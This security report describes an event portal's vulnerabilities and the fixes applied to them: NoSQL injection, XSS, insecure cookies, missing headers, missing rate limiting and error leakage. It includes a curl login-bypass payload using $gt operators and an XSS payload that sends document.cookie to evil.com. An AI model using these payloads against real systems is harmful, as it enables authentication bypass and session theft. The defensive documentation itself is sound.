# Security Analysis Report - TechFest 2026 Portal

## Vulnerabilities Identified and Fixed

### 1. NoSQL Injection (Critical)

**Risk Level:** CRITICAL
**Location:** `/api/auth/login` route

**Vulnerability:** MongoDB query operators (`$gt`, `$ne`, `$regex`) in user input
can bypass authentication by matching all records.

**Attack Demonstration:**
```bash
# This malicious request would bypass login on vulnerable version:
curl -X POST http://localhost:5000/api/auth/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"email": {"$gt": ""}, "password": {"$gt": ""}}'
```

**Fix Applied:**
- Installed `express-mongo-sanitize` - strips `$` and `.` from input
- Used `bcryptjs` for password hashing (no plain-text password comparison)
- Added input validation before database queries

**Status:** FIXED and VERIFIED

---

### 2. Cross-Site Scripting - XSS (High)

**Risk Level:** HIGH
**Location:** Feedback form comment field

**Vulnerability:** User-supplied HTML/JavaScript rendered without escaping
allows script injection.

**Attack Demonstration:**
```
Input in feedback form:
<script>alert('XSS Attack!')</script>
<img src=x onerror="document.location='http://evil.com/steal?c='+document.cookie">
```

**Before Fix:** The script executes, showing an alert or stealing cookies.

**Fix Applied:**
- React's JSX auto-escapes content (uses `{}` not `dangerouslySetInnerHTML`)
- Server strips HTML tags: `comment.replace(/<[^>]*>/g, "")`
- Helmet's CSP header blocks inline scripts
- `X-XSS-Protection` header enabled

**After Fix:** The script tag is displayed as plain text, not executed.

**Status:** FIXED and VERIFIED

---

### 3. Insecure Cookies (Medium)

**Risk Level:** MEDIUM
**Location:** Authentication cookie settings

**Fix Applied:**
```javascript
res.cookie("token", jwt, {
  httpOnly: true,    // JS cannot read (blocks document.cookie theft)
  secure: true,      // HTTPS only
  sameSite: "strict" // Blocks CSRF
});
```

**CSRF Protection Explanation:**
- CSRF: Attacker's site makes a request to our API using victim's cookies
- `sameSite: "strict"` tells browser: never send this cookie with cross-origin requests
- Combined with CORS restrictions, this blocks both CSRF and cookie theft

**Status:** FIXED and VERIFIED

---

### 4. Missing Security Headers (Medium)

**Fix:** Helmet middleware adds 11 security headers automatically.

**Status:** FIXED and VERIFIED

---

### 5. Missing Rate Limiting (Medium)

**Fix:** `express-rate-limit` applied to all API routes (100 req/15min)
and stricter limit on auth routes (20 req/15min).

**Status:** FIXED and VERIFIED

---

### 6. Information Leakage (Low)

**Fix:** Global error handler returns generic message in production,
stack traces only in development.

**Status:** FIXED and VERIFIED

---

## Security Testing Results

| Test                          | Before | After  |
|-------------------------------|--------|--------|
| NoSQL Injection bypass        | FAIL   | PASS   |
| XSS script execution          | FAIL   | PASS   |
| Cookie theft via JS           | FAIL   | PASS   |
| CSRF attack                   | FAIL   | PASS   |
| Brute force login             | FAIL   | PASS   |
| Stack trace in error response | FAIL   | PASS   |
| HTTPS enforced                | FAIL   | PASS   |

All demonstrated vulnerabilities no longer work after fixes.
